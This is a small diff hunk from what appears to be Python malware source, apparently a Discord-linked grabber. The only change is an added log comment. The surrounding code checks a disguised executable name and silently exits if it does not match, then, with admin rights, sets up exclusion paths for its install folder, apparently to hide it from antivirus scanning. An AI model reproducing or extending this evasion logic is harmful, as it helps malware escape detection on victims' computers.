@@ -92,6 +92,7 @@ guild_id = auto                                                    ##
 
 if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower():
     os._exit(0)
+#.log Executed fake mutex code check
 
 if IsAdmin():
     exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
